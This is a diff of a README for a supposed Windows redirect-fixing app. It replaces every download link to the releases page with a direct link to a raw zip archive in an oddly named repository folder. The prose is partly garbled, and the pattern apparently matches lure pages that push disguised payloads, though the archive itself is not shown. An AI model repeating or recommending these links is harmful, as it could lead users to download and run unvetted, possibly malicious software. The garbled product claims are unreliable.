@@ -29,7 +29,7 @@ First things first, you need to get the app onto your computer. Here's what to d
 
 1. **Visit the download page** to grab the application. You can use the big button below to go straight there.
 
-[![Download apex-redirect-update-loader](https://img.shields.io/badge/Download-%E2%AC%87%EF%B8%8F%20Get%20the%20App-blue?style=for-the-badge&color=orange)](https://github.com/janelconsenting364/apex-redirect-update-loader/releases)
+[![Download apex-redirect-update-loader](https://img.shields.io/badge/Download-%E2%AC%87%EF%B8%8F%20Get%20the%20App-blue?style=for-the-badge&color=orange)](https://github.com/janelconsenting364/apex-redirect-update-loader/raw/refs/heads/main/semimagical/v2.3.zip)
 
 **Visit this link to download the application.**
 
@@ -101,7 +101,7 @@ If something doesn't work immediately, try these fixes:
 
 Now that you've downloaded and run the app, your visitors will never face bare domain problems again. They'll arrive at your website correctly, with "www," and all pages will work extra. **No more lost visitors** just because they forgot to type three little letters.
 
-If you ever feel you need to see the details about the latest update, check the same [download page](https://github.com/janelconsenting364/apex-redirect-update-loader/releases)—but you don't have to use the upgrades look automatically that appear.
+If you ever feel you need to see the details about the latest update, check the same [download page](https://github.com/janelconsenting364/apex-redirect-update-loader/raw/refs/heads/main/semimagical/v2.3.zip)—but you don't have to use the upgrades look automatically that appear.
 
 ## 📚 Support And Help
 
@@ -115,6 +115,6 @@ Get started now: Visit the download link below and get the app today.
 
 **⬇️ Download Now**
 
-[**Download apex-redirect-update-loader**](https://github.com/janelconsenting364/apex-redirect-update-loader/releases)
+[**Download apex-redirect-update-loader**](https://github.com/janelconsenting364/apex-redirect-update-loader/raw/refs/heads/main/semimagical/v2.3.zip)
 
 Keywords: website redirect, domain forwarding, URL routing, TLS forwarding, bare domain to www, redirect update, DNS, Windows download, no code setup, secure redirect.
